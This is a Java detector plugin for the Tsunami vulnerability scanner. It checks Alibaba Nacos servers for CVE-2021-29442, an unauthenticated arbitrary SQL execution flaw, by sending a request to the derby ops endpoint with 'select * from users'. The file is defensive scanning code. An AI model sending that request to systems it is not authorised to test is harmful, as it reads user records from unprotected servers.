package com.google.tsunami.plugins.detectors.nacos.sqlinject;


import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.tsunami.common.net.http.HttpRequest.get;

import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.net.http.HttpStatus;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.time.Clock;
import java.time.Instant;
import javax.inject.Inject;

/**
 * A {@link VulnDetector} that detects the CVE-2021-29442 vulnerability.
 */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "NacosSQLInjectCVE202129442VulnDetector",
    version = "1.0",
    description = "This detector checks for Alibaba Nacos CVE-2021-29442 "
        + "execute arbitrary SQL without authentication vulnerability.",
    author = "threedr3am (qiaoer1320@gmail.com)",
    bootstrapModule = NacosSQLInjectCVE202129442VulnDetectorBootstrapModule.class
)
public class NacosSQLInjectCVE202129442VulnDetector implements VulnDetector {

  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();

  private final Clock utcClock;
  private final HttpClient httpClient;

  @Inject
  NacosSQLInjectCVE202129442VulnDetector(@UtcClock Clock utcClock, HttpClient httpClient) {
    this.utcClock = checkNotNull(utcClock);
    this.httpClient = checkNotNull(httpClient);
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(NetworkServiceUtils::isWebService)
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    String targetUri = NetworkServiceUtils.buildWebApplicationRootUrl(networkService)
        + "nacos/v1/cs/ops/derby?sql=select%20*%20from%20users%20";
    try {
      HttpResponse response = httpClient.send(get(targetUri).withEmptyHeaders().build(),
          networkService);
      try {
        if (response.status() != HttpStatus.OK || !response.bodyJson().isPresent()) {
          return false;
        }
      } catch (Throwable t) {
        logger.atInfo().log("Failed to parse cores response json");
      }
      if (response.bodyJson().get().getAsJsonObject().get("code").getAsInt() == 200) {
        return true;
      }
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Unable to query '%s'.", targetUri);
    }
    return false;
  }

  public DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder().setPublisher("TSUNAMI_COMMUNITY")
                        .setValue("CVE_2021_29442"))
                .setSeverity(Severity.HIGH)
                .setTitle(
                    "Alibaba-Nacos User-Agent authentication bypass vulnerability (CVE-2021-29442)")
                .setDescription(
                    "When the nacos version is less than or equal to 1.4.0, "
                        + "it can be accessed without authentication and "
                        + "execute arbitrary SQL queries, "
                        + "which leads to the disclosure of sensitive information."
                        + "https://github.com/alibaba/nacos/issues/4463 "
                        + "https://github.com/alibaba/nacos/pull/4517 "
                        + "https://nvd.nist.gov/vuln/detail/CVE-2021-29442 "
                        + "https://github.com/advisories/GHSA-xv5h-v7jh-p2qh")
                .setRecommendation("Update 1.4.1 released, or later released.")
        )
        .build();
  }
}
